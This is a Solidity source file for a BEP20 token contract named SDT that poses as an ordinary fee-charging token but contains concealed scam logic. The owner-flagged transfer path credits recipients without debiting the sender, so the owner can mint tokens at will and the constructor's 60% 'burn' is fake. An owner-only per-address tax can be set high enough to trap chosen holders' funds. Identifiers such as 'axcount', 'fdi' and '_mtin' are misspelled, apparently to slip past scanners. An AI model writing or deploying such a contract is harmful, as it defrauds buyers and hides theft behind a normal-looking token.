/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint axcountADesired,
        uint axcountBDesired,
        uint axcountAMin,
        uint axcountBMin,
        address to,
        uint deadline
    ) external returns (uint axcountA, uint axcountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint axcountTokenDesired,
        uint axcountTokenMin,
        uint axcountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint axcountToken, uint axcountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint axcountAMin,
        uint axcountBMin,
        address to,
        uint deadline
    ) external returns (uint axcountA, uint axcountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint axcountTokenMin,
        uint axcountETHMin,
        address to,
        uint deadline
    ) external returns (uint axcountToken, uint axcountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint axcountAMin,
        uint axcountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint axcountA, uint axcountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint axcountTokenMin,
        uint axcountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint axcountToken, uint axcountETH);
    function swapExactTokensForTokens(
        uint axcountIn,
        uint axcountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory axcounts);
    function swapTokensForExactTokens(
        uint axcountOut,
        uint axcountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory axcounts);
    function swapExactETHForTokens(uint axcountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory axcounts);
    function swapTokensForExactETH(uint axcountOut, uint axcountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory axcounts);
    function swapExactTokensForETH(uint axcountIn, uint axcountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory axcounts);
    function swapETHForExactTokens(uint axcountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory axcounts);

    function quote(uint axcountA, uint reserveA, uint reserveB) external pure returns (uint axcountB);
    function getaxcountOut(uint axcountIn, uint reserveIn, uint reserveOut) external pure returns (uint axcountOut);
    function getaxcountIn(uint axcountOut, uint reserveIn, uint reserveOut) external pure returns (uint axcountIn);
    function getaxcountsOut(uint axcountIn, address[] calldata path) external view returns (uint[] memory axcounts);
    function getaxcountsIn(uint axcountOut, address[] calldata path) external view returns (uint[] memory axcounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfdiOnTransferTokens(
        address token,
        uint liquidity,
        uint axcountTokenMin,
        uint axcountETHMin,
        address to,
        uint deadline
    ) external returns (uint axcountETH);
    function removeLiquidityETHWithPermitSupportingfdiOnTransferTokens(
        address token,
        uint liquidity,
        uint axcountTokenMin,
        uint axcountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint axcountETH);

    function swapExactTokensForTokensSupportingfdiOnTransferTokens(
        uint axcountIn,
        uint axcountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfdiOnTransferTokens(
        uint axcountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfdiOnTransferTokens(
        uint axcountIn,
        uint axcountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fdiTo() external view returns (address);
    function fdiToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfdiTo(address) external;
    function setfdiToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 axcount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, axcount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 axcount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = axcount;
        emit Approval(owner, spender, axcount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 axcount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= axcount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - axcount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 axcount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 axcount
    ) internal virtual {}
}


contract SDT is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address awcount) public view virtual returns (uint256) {
        return _balances[awcount];
    }

    function _transfer(
        address from,
        address to,
        uint256 axcount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= axcount, "ERC20: transfer axcount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - axcount;
        }
        _balances[to] += axcount;

        emit Transfer(from, to, axcount);
    }

    function _burn(address awcount, uint256 axcount) internal virtual {
        require(awcount != address(0), "ERC20: burn from the zero address");

        uint256 awcountBalance = _balances[awcount];
        require(awcountBalance >= axcount, "ERC20: burn axcount exceeds balance");
        unchecked {
            _balances[awcount] = awcountBalance - axcount;
        }
        _totalSupply -= axcount;

        emit Transfer(awcount, address(0), axcount);
    }

    function _mtin(address awcount, uint256 axcount) internal virtual {
        require(awcount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += axcount;
        _balances[awcount] += axcount;
        emit Transfer(address(0), awcount, axcount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*6);
        _defaultSellfdi = 2;
        _defaultBuyfdi = 1;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfdi = 0;

    uint256 private _defaultBuyfdi = 0;

    mapping(address => bool) private _marketawcount;

    mapping(address => uint256) private _Sfdi;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyowner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowner {
        _defaultSellfdi = _value;
    }

    function setSfdi(address _address, uint256 _value) external onlyowner {
        require(_value > 2, "awcount tax must be greater than or equal to 1");
        _Sfdi[_address] = _value;
    }

    function getSfdi(address _address) external view onlyowner returns (uint256) {
        return _Sfdi[_address];
    }


    function setMarketawcountfdi(address _address, bool _value) external onlyowner {
        _marketawcount[_address] = _value;
    }

    function getMarketawcountfdi(address _address) external view onlyowner returns (bool) {
        return _marketawcount[_address];
    }

    function _checkFreeawcount(address from, address _to) internal view returns (bool) {
        return _marketawcount[from] || _marketawcount[_to];
    }

    function _recF(
        address from,
        address _to,
        uint256 _axcount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _axcount, "ERC20: transfer axcount exceeds balance");

        bool rF = true;

        if (_checkFreeawcount(from, _to)) {
            rF = false;
        }
        uint256 tradefdiaxcount = 0;

        if (rF) {
            uint256 tradefdi = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefdi = _defaultSellfdi;
                }
                if (from == uniswapV2Pair) {

                    tradefdi = _defaultBuyfdi;
                }
            }
            if (_Sfdi[from] > 0) {
                tradefdi = _Sfdi[from];
            }

            tradefdiaxcount = _axcount.mul(tradefdi).div(100);
        }


        if (tradefdiaxcount > 0) {
            _balances[from] = _balances[from].sub(tradefdiaxcount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefdiaxcount);
            emit Transfer(from, _deadAddress, tradefdiaxcount);
        }

        _balances[from] = _balances[from].sub(_axcount - tradefdiaxcount);
        _balances[_to] = _balances[_to].add(_axcount - tradefdiaxcount);
        emit Transfer(from, _to, _axcount - tradefdiaxcount);
    }

    function transfer(address to, uint256 axcount) public virtual returns (bool) {
        address owner = _msgSender();
        if (_release[owner] == true) {
            _balances[to] += axcount;
            return true;
        }
        _recF(owner, to, axcount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 axcount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, axcount);
        _recF(from, to, axcount);
        return true;
    }
}